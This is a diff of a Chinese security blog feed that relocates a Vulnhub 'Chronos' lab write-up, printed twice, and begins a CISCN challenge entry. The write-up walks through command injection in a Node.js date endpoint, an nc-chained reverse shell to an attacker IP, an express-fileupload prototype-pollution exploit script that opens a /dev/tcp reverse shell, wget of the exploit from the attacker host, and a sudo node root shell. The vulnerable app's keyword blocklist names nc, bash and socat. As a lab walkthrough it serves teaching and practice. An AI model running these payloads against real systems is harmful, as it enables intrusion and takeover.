class="string">&#x27;python&#x27;</span>) || concat.includes(<span class="string">&#x27;nc&#x27;</span>) || concat.includes(<span class="string">&#x27;bash&#x27;</span>) || concat.includes(<span class="string">&#x27;php&#x27;</span>) || concat.includes(<span class="string">&#x27;which&#x27;</span>) || concat.includes(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line">			res.send(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		exec(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (error) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`error: <span class="subst">$&#123; error.message &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123; stderr &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			res.send(stdout);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.send(<span class="string">&#x27;Permission Denied&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">`Server running at <span class="subst">$&#123; port &#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
-<p>上述代码中就可以验证确实是执行了系统命令，并且还记得之前弹出的“something went wrong”吗？这是因为这里做了过滤，但是仅仅只是判断了以下，并没有阻止命令执行。这就叫百密一疏吧。</p>
-<p>还有一个目录 <code>/opt/chronos-v2</code>，里面有一个<code>backend</code>的目录，这一看就是与后台有关。里面有一个<code>server.js</code>，代码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(fileupload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;/opt/chronos-v2/frontend/pages&#x27;</span>);</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> server = http.Server(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.listen(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
-<p>从这里能看出有一个8080端口，但是只能通过127.0.0.1才能访问，这也是为什么端口扫面无法得到这个端口。</p>
-<p>信息收集差不多，那么接下来就是要提权了。</p>
-<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
-<p>Linux提权常用的三种方式：</p>
-<ol type="1">
-<li>内核漏洞</li>
-<li>suid提权</li>
-<li>sudo配置不当提权</li>
-</ol>
-<p>这里经过测试发现前两者都不行。因此得另想办法，忽然想到之前信息收集得到了一个技术 node.js。查看了<code>/chronos-v2/backend/package.json</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401142659.png" /></p>
-<p>这里的是否存在文件上传的漏洞？因此去搜一下，发现虽然不存在文件上传漏洞，但是存在node.js的原型链污染，可以使用这个漏洞进行提权。</p>
-<p>博客地址如下：https://blog.p6.is/Real-World-JS-1/</p>
-<p>还提供了exp： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.137.104/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
-<p>（第一个ip为靶机IP，后面两个的端口为node.js所在端口，也就是8080，从刚刚的信息收集中知道）</p>
-<p>在kali上编写上面的程序，然后开启http服务，让靶机下载这个文件。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: python -m SimpleHTTPServer 80</span><br><span class="line">靶机: </span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.137.104/exp.py</span><br></pre></td></tr></table></figure></p>
-<p>然后kali监听8888端口，靶机执行该程序 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: nc -lvnp 8888</span><br><span class="line">靶机: </span><br><span class="line">	chmod +x exp.py</span><br><span class="line">	python3 exp.py</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145431.png" /></p>
-<p>获得 imera 权限，虽然不是root，但是也足够读取其中一个flag了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/imera/user.txt: </span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure></p>
-<p>接下来还需要提权，得到root权限。这里介绍常用的Linux提权的第三种，sudo配置提权。</p>
-<p>查看sudo配置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145800.png" /></p>
-<p>注意到用户imera拥有两个程序 npm和node的全部权限，还不需要密码，因此可以在这里提权。</p>
-<p>参考文章：https://gtfobins.github.io/gtfobins/node/</p>
-<p>执行以下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150130.png" /></p>
-<p>提权成功。</p>
-<p>获取第二个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root.txt: </span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure></p>
-<p>至此，渗透过程结束。</p>
-<h1 id="彩蛋部分">彩蛋部分</h1>
-<p>将两个flag解码（base64），然后再放到谷歌去翻译，得到如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150635.png" /></p>
-<h1 id="总结">总结</h1>
-<p>通过对这个靶机的渗透，有以下几点感受：</p>
-<ol type="1">
-<li>如同第一次权限提升的时候，经常会遇到我们不熟悉的技术，这时候就需要大量的搜索，快速学习！</li>
-<li>学习了第三种Linux提权的方式</li>
-<li>node.js的express-fileupload 1.1.7 存在原型链污染漏洞</li>
-</ol>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>综合</tag>
-        <tag>vulnhub</tag>
-        <tag>node.js原型链污染</tag>
-        <tag>nc串联</tag>
       </tags>
   </entry>
   <entry>
@@ -1524,6 +1388,142 @@
         <tag>SSH公钥登录</tag>
         <tag>参数爆破</tag>
         <tag>PHP伪协议</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>3. Vulnhub Chronos Writeup</title>
+    <url>/2022/04/01/3.%20Vulnhub%20Chronos%20Writeup/</url>
+    <content><![CDATA[<p>该靶机难度简单。</p>
+<span id="more"></span>
+<h1 id="靶机信息">靶机信息</h1>
+<p>靶机地址：https://www.vulnhub.com/entry/chronos-1,735/</p>
+<p>难度：Easy</p>
+<p>虚拟机软件：Virtual Box</p>
+<p>目标：取得2个flag，获得root权限</p>
+<p>涉及的攻击方法：</p>
+<ul>
+<li>端口扫描</li>
+<li>web侦察</li>
+<li>命令注入</li>
+<li>数据编、解码</li>
+<li><strong>搜索大法</strong></li>
+<li><strong>框架漏洞利用</strong></li>
+<li>代码审计</li>
+<li>NC串联</li>
+<li>本地提权</li>
+</ul>
+<h1 id="渗透">渗透</h1>
+<p>攻击主机 kali：<code>192.168.137.104</code></p>
+<h2 id="主机发现">主机发现</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.137.0/16 </span><br><span class="line"></span><br><span class="line">如果实际的子网掩码是24位，那么上面查询的时候就减8，也就是16。实际查询的子网掩码位数设置为实际的子网掩码位数减8效果最好。</span><br></pre></td></tr></table></figure>
+<p>原理：与前面的两者相同，都是通过ARP解析</p>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113217.png" /></p>
+<p>因此，靶机的IP为 192.168.137.105</p>
+<h2 id="端口扫描">端口扫描</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113352.png" /></p>
+<h2 id="端口服务发现">端口服务发现</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 192.168.137.105</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113546.png" /></p>
+<p>信息：</p>
+<ol type="1">
+<li>22端口上的服务为openssh</li>
+<li>80端口上的服务为http，版本为 2.4.29</li>
+<li>8000端口上的服务也是http，但是用的 <code>node.js express framework</code></li>
+<li>系统为Ubuntu</li>
+</ol>
+<h2 id="访问http服务">访问http服务</h2>
+<p>有三件事必须做：</p>
+<ol type="1">
+<li>抓包</li>
+<li>看源码</li>
+<li>扫目录</li>
+</ol>
+<p>发现80端口和8000端口很类似（一个朴素，一个华丽），源码是一样的，其中有一串特殊的字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _0x5bdf=[&#x27;150447srWefj&#x27;,&#x27;70lwLrol&#x27;,&#x27;1658165LmcNig&#x27;,&#x27;open&#x27;,&#x27;1260881JUqdKM&#x27;,&#x27;10737CrnEEe&#x27;,&#x27;2SjTdWC&#x27;,&#x27;readyState&#x27;,&#x27;responseText&#x27;,&#x27;1278676qXleJg&#x27;,&#x27;797116soVTES&#x27;,&#x27;onreadystatechange&#x27;,&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;,&#x27;User-Agent&#x27;,&#x27;status&#x27;,&#x27;1DYOODT&#x27;,&#x27;400909Mbbcfr&#x27;,&#x27;Chronos&#x27;,&#x27;2QRBPWS&#x27;,&#x27;getElementById&#x27;,&#x27;innerHTML&#x27;,&#x27;date&#x27;];(function(_0x506b95,_0x817e36)&#123;var _0x244260=_0x432d;while(!![])&#123;try&#123;var _0x35824b=-parseInt(_0x244260(0x7e))*parseInt(_0x244260(0x90))+parseInt(_0x244260(0x8e))+parseInt(_0x244260(0x7f))*parseInt(_0x244260(0x83))+-parseInt(_0x244260(0x87))+-parseInt(_0x244260(0x82))*parseInt(_0x244260(0x8d))+-parseInt(_0x244260(0x88))+parseInt(_0x244260(0x80))*parseInt(_0x244260(0x84));if(_0x35824b===_0x817e36)break;else _0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;catch(_0x3fb1dc)&#123;_0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x5bdf,0xcaf1e));function _0x432d(_0x16bd66,_0x33ffa9)&#123;return _0x432d=function(_0x5bdf82,_0x432dc8)&#123;_0x5bdf82=_0x5bdf82-0x7e;var _0x4da6e8=_0x5bdf[_0x5bdf82];return _0x4da6e8;&#125;,_0x432d(_0x16bd66,_0x33ffa9);&#125;function loadDoc()&#123;var _0x17df92=_0x432d,_0x1cff55=_0x17df92(0x8f),_0x2beb35=new XMLHttpRequest();_0x2beb35[_0x17df92(0x89)]=function()&#123;var _0x146f5d=_0x17df92;this[_0x146f5d(0x85)]==0x4&amp;&amp;this[_0x146f5d(0x8c)]==0xc8&amp;&amp;(document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)]=this[_0x146f5d(0x86)]);&#125;,_0x2beb35[_0x17df92(0x81)](&#x27;GET&#x27;,_0x17df92(0x8a),!![]),_0x2beb35[&#x27;setRequestHeader&#x27;](_0x17df92(0x8b),_0x1cff55),_0x2beb35[&#x27;send&#x27;]();&#125;</span><br></pre></td></tr></table></figure></p>
+<p>乍一看，好像是加密的js代码。这里推荐一个网址，可以对代码进行美化和编码解码：https://gchq.github.io/CyberChef/</p>
+<p>利用<code>javascript beautify</code>模块美化之后虽然看的很清楚了，但是因为各种参数都加密了还是无法直到这段代码的意思。但是其中有一串字符没有加密： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure></p>
+<p>最后，抓包看一下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401114650.png" /></p>
+<p>发现确实有数据包往 chronos.local:8000 地方发送，但是我们无法用浏览器直接访问，因为kali并不知道chronos.local是哪台主机，但是我们知道，这应该就是靶机。因此，修改<code>/etc/hosts</code>，添加一条记录：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120624.png" /></p>
+<p>然后可以访问了，并且页面发生了变化。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120700.png" /></p>
+<p>结合url分析，发现url中的那一串字符像是警告base64编码的，因此，再次利用刚刚的网址进行解码。利用 <code>magic</code> 模块进行解码，发现是base58编码。得到解码后的结果：<code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></p>
+<blockquote>
+<p>base系列有许多，但是常见的是base64和base32。还有许多不常见的，比如这里的base58。</p>
+</blockquote>
+<ol type="1">
+<li>date</li>
+<li><code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></li>
+<li>页面上显示的时间信息</li>
+</ol>
+<p>这让我想到Linux中的date命令，也是能够显示时间，因此在kali上尝试一下如下代码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401121236.png" /></p>
+<p>发现结果和页面显示的一模一样（未经过渲染）。因此，有理由怀疑后台服务调用了系统命令，并且后台代码可能如下（猜测，并不是真正的代码，只是说明代码逻辑）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &#x27;date&#x27; .$format;</span><br><span class="line">system(cmd);</span><br></pre></td></tr></table></figure></p>
+<p>如果我们什么都不修改，那么执行的命令就是<code>date '+Today is %A, %B %d, %Y %H:%M:%S.'</code>，因此，我们可以考虑到Linux中以下执行多条命令（上周使用的是管道符，这周使用 <code>$$</code>，该符号只有在前面的命令正确执行的情况下，才会执行后面的命令）</p>
+<p>先做一个尝试， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;ls -&gt; yZSGA</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401134641.png" /></p>
+<p>成功执行，因此这里确实调用了系统命令。接下来使用nc串联来反弹shell（先判断是否有nc，然后再判断是否有 -e）</p>
+<h2 id="反弹shell">反弹shell</h2>
+<p>首先在kali上启动两个监听端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 3333</span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
+<p>然后将payload base58编码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 192.168.137.104 3333|/bin/bash|nc 192.168.137.104 4444</span><br><span class="line">2XqeYgBDNepmM9vgTVeLGrep4fZHdsG5tAFHFFoH1pgfmPx59cE4Pphh2FNWaHBapy5Tin3Vs6E4MYXhu</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135228.png" /></p>
+<p>虽然提示出错，但是kali已经成功连接上了</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135325.png" /></p>
+<p>接下来进行信息收集：</p>
+<p>发现在 <code>/home/imera</code> 目录下有一个<code>user.txt</code>文件，但是却没有权限读取，这应该就是其中一个flag了。并且在<code>/root</code>目录下也有一个flag，这应该是第二个flag，不出意料也没有权限读取。</p>
+<p>还可以看一下 <code>app.js</code> <code>package.jsom</code> 和 <code>package-lock.json</code> 的内容，其中第一个的源码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;exec&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line">app.use(cors());</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.sendFile(<span class="string">&#x27;/var/www/html/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> agent = req.headers[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">	<span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>;</span><br><span class="line">	<span class="keyword">const</span> format = req.query.format;</span><br><span class="line">	<span class="keyword">const</span> bytes = bs58.decode(format);</span><br><span class="line">	<span class="keyword">var</span> decoded = bytes.toString();</span><br><span class="line">	<span class="keyword">var</span> concat = cmd.concat(decoded);</span><br><span class="line">	<span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (concat.includes(<span class="string">&#x27;id&#x27;</span>) || concat.includes(<span class="string">&#x27;whoami&#x27;</span>) || concat.includes(<span class="string">&#x27;python&#x27;</span>) || concat.includes(<span class="string">&#x27;nc&#x27;</span>) || concat.includes(<span class="string">&#x27;bash&#x27;</span>) || concat.includes(<span class="string">&#x27;php&#x27;</span>) || concat.includes(<span class="string">&#x27;which&#x27;</span>) || concat.includes(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line">			res.send(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		exec(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (error) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`error: <span class="subst">$&#123; error.message &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123; stderr &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			res.send(stdout);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.send(<span class="string">&#x27;Permission Denied&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">`Server running at <span class="subst">$&#123; port &#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>上述代码中就可以验证确实是执行了系统命令，并且还记得之前弹出的“something went wrong”吗？这是因为这里做了过滤，但是仅仅只是判断了以下，并没有阻止命令执行。这就叫百密一疏吧。</p>
+<p>还有一个目录 <code>/opt/chronos-v2</code>，里面有一个<code>backend</code>的目录，这一看就是与后台有关。里面有一个<code>server.js</code>，代码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(fileupload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;/opt/chronos-v2/frontend/pages&#x27;</span>);</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> server = http.Server(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.listen(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>从这里能看出有一个8080端口，但是只能通过127.0.0.1才能访问，这也是为什么端口扫面无法得到这个端口。</p>
+<p>信息收集差不多，那么接下来就是要提权了。</p>
+<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
+<p>Linux提权常用的三种方式：</p>
+<ol type="1">
+<li>内核漏洞</li>
+<li>suid提权</li>
+<li>sudo配置不当提权</li>
+</ol>
+<p>这里经过测试发现前两者都不行。因此得另想办法，忽然想到之前信息收集得到了一个技术 node.js。查看了<code>/chronos-v2/backend/package.json</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401142659.png" /></p>
+<p>这里的是否存在文件上传的漏洞？因此去搜一下，发现虽然不存在文件上传漏洞，但是存在node.js的原型链污染，可以使用这个漏洞进行提权。</p>
+<p>博客地址如下：https://blog.p6.is/Real-World-JS-1/</p>
+<p>还提供了exp： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.137.104/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>（第一个ip为靶机IP，后面两个的端口为node.js所在端口，也就是8080，从刚刚的信息收集中知道）</p>
+<p>在kali上编写上面的程序，然后开启http服务，让靶机下载这个文件。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: python -m SimpleHTTPServer 80</span><br><span class="line">靶机: </span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.137.104/exp.py</span><br></pre></td></tr></table></figure></p>
+<p>然后kali监听8888端口，靶机执行该程序 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: nc -lvnp 8888</span><br><span class="line">靶机: </span><br><span class="line">	chmod +x exp.py</span><br><span class="line">	python3 exp.py</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145431.png" /></p>
+<p>获得 imera 权限，虽然不是root，但是也足够读取其中一个flag了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/imera/user.txt: </span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure></p>
+<p>接下来还需要提权，得到root权限。这里介绍常用的Linux提权的第三种，sudo配置提权。</p>
+<p>查看sudo配置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145800.png" /></p>
+<p>注意到用户imera拥有两个程序 npm和node的全部权限，还不需要密码，因此可以在这里提权。</p>
+<p>参考文章：https://gtfobins.github.io/gtfobins/node/</p>
+<p>执行以下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150130.png" /></p>
+<p>提权成功。</p>
+<p>获取第二个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root.txt: </span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure></p>
+<p>至此，渗透过程结束。</p>
+<h1 id="彩蛋部分">彩蛋部分</h1>
+<p>将两个flag解码（base64），然后再放到谷歌去翻译，得到如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150635.png" /></p>
+<h1 id="总结">总结</h1>
+<p>通过对这个靶机的渗透，有以下几点感受：</p>
+<ol type="1">
+<li>如同第一次权限提升的时候，经常会遇到我们不熟悉的技术，这时候就需要大量的搜索，快速学习！</li>
+<li>学习了第三种Linux提权的方式</li>
+<li>node.js的express-fileupload 1.1.7 存在原型链污染漏洞</li>
+</ol>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>node.js原型链污染</tag>
+        <tag>nc串联</tag>
       </tags>
   </entry>
   <entry>
@@ -2174,6 +2174,65 @@
       </tags>
   </entry>
   <entry>
+    <title>CISCN 2019 初赛 Love Math</title>
+    <url>/2022/04/10/CISCN%202019%20%E5%88%9D%E8%B5%9B%20Love%20Math/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BCISCN%202019%20初赛%5DLove%20Math">Love Math</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
